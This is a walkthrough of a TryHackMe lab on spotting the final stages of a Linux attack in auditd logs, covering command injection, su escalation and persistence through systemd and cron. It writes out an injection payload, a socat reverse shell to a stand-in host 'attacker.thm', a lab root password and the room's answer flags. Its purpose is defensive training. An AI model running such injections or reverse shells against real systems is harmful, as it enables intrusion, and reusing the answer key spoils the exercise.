<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Linux Threat Detection 3
|  Room Name | Linux Threat Detection 3 |
|----------|-------|
| Author | Dhruv Tripathi |
| Link | [Linux Threat Detection 3](https://tryhackme.com/room/linuxthreatdetection3) |

# Room Information
```bash Type: Walkthrough
Difficulty: Medium  
Tags: - 
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Cover the last stages of attacks on Linux and learn how they look in system logs.
```
## Task 1

### Let's go!

- Answer: `No answer needed`

## Task 2

### Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?

- For this question, we needed to launch the Attackbox and go to the TryPingMe web application at `http://MACHINE_IP:8000`. Once we enter the command into the textbox, the application returns the answer. This is an example of OS command injection, which occurs when a web application fails to properly validate or sanitise user input and passes it directly to the system shell for execution. In this case, the first command checks the loopback address. Since that check returns true, the `whoami` command is then executed, which displays the username of the user running the command
  
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2bb79076-0693-464d-ad0b-1de92b6ff7a8" />
</p>

- Answer: `svctrypingme`

### Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?

- Similar to the last question, we can enter the command into the textbox. This is another example of OS command injection. The first command checks the loopback address, and if successful, the `socat` command establishes a TCP connection to the attacker's machine on port `1337` and attempts to provide access to the server's shell. This is known as a reverse shell

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/69d1873d-0c92-4681-b477-e1102fb0713a" />
</p>

- Answer: `THM{revshells_practitioner!}`

### Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?

- We can filter via `ausearch -i -if /home/ubuntu/scenario/audit.log -x socat` to search the audit logs for executions of `socat`. In the output, I found a TCP connection to `10.14.105.255` on port `1337`. The working directory was `/opt/trypingme`, indicating that the command originated from the TryPingMe application

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b7259930-73e9-422a-b1fb-9ad5a5232836" />
</p>

- Answer: `10.14.105.255`

## Task 3

### Which command line was used to look for the "pass" keyword in files?

- We can search the log file via `ausearch -i -if /home/ubuntu/scenario/audit.log | grep pass`. Looking at the four lines of output, while `find` searched for filenames containing `pass`, the only command used to look for `pass` inside files was `grep`. The second entry `proctitle=grep -iR pass .` shows `grep` running recursively `-R` and case-insensitively `-i` to search for the string pass within the contents of files in the current directory

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/043f870e-0e12-4898-9c6f-4899acee2e5b" />
</p>

- Answer: `grep -iR pass .`

### Which command line was used to escalate privileges to root?

- To find how privileges were escalated, we can filter the log for root activity using `ausearch -i -if /home/ubuntu/scenario/audit.log | grep root`. Looking at the first two lines of the output `(proctitle=su root and a0=su a1=root)`, we can see the threat actor used `su root` to switch to the root user

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/1048f9b2-782d-47ca-82eb-f1e21e07138e" />
</p>

- Answer: `su root`

### Looking at the detected .env file, what was the root password?

- We know the attacker read the `.env.local` file as seen below

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2658758e-6e03-4d2c-a27b-9f42a5d4aa1b" />
</p>

- Now the question was: where was this file actually located? To search the entire filesystem starting from the root directory, we can run `sudo find / -name ".env.local"`. This shows where the file is located at

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/aa09422f-5567-464b-bfb5-f10699d5ea4e" />
</p>

- We can navigate to the above location and read the file getting the root's password

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/cf2ae2ed-dd11-4b12-bbe8-c03d2f4248e4" />
</p>

- Answer: `nGql1pQkGa`

## Task 4

### What flag did you get after running the malware persisting as a service?

- Systemd services manage critical background services on Linux, and their configuration files (ending with `.service`) are stored in directories like `/etc/systemd/system/` and `/lib/systemd/system/`. Because any user with root privileges can create or modify a service file in these folders to make malicious payloads survive a reboot, monitoring `/etc/systemd/system` with auditd allows us to catch attackers establishing persistence in real time. Therefore, we can filter the audit logs via `ausearch -i -f /etc/systemd/system/` and notice that there are two services here which are `tux.service` and `badr.service`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/7ab2f2cf-eca2-42e4-88eb-1c9850ac935c" />
</p>

- First, I checked `badr.service` because it was downloaded from the internet using `wget`, and I tried going to `/etc/badr/badr` and `/var/log/badr.log` to investigate further. However, both gave a `No such file or directory` error because the service is actually TryHackMe's own setup tool and automatically deletes its files after 10 seconds (`sleep 10 && rm -f`). Since this was a dead end, I moved on to look at `tux.service` instead

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/cb3df236-925d-4491-9495-e4b3b31100c5" />
</p>

- We can check `/etc/systemd/system/tux.service` using `cat tux.service` and see that its `ExecStart` points to a binary located at `/var/lib/misc/tux`. I navigated to `/var/lib/misc`, confirmed with file tux that it was a 64-bit Linux executable, and ran `./tux`. It prompted me for the location where the persistence was established, and entering `/etc/systemd/system/tux.service` revealed the flag

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/9d222df3-b532-4019-992d-8356998fb4a1" />
</p>

- Answer: `THM{hidden_penguin!}`

### What flag did you get after running the malware persisting as a cron job?

-  We can look for cron-based persistence by filtering the audit logs with `ausearch -i -f /var/spool/cron`. Cron jobs are one of the most common ways attackers maintain persistence on Linux because they execute commands automatically on a schedule or at system reboot (`@reboot`). Monitoring `/var/spool/cron` with auditd catches any unauthorized edits made to user crontab files. The search results showed a `crontab -e` command creating a temporary file inside `/var/spool/cron/crontabs/`. Since accessing the crontabs directory requires elevated privileges, I switched to the root user (`sudo su`), navigated to `/var/spool/cron/crontabs`, and found a root ASCII text file containing the scheduled jobs

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/61321906-e00f-4c17-a956-6697e9ab9e0c" />
</p>

- Below we can see that payload binary is located at `/usr/sbin/phoenix`

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/e38bcff0-1c5b-4fed-a6d2-1fd64e32ea88" />
</p>

Then, I navigated to `/usr/sbin/`, verified that phoenix was a 64-bit Linux executable using file phoenix, and ran `./phoenix`. When prompted for where it persisted, entering `/var/spool/cron/crontabs/root` gave the flag

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a7c3e0c6-9c42-4bf7-a26b-7cceac26126f" />
</p>

- Answer: `THM{ressurect_on_reboot!}`
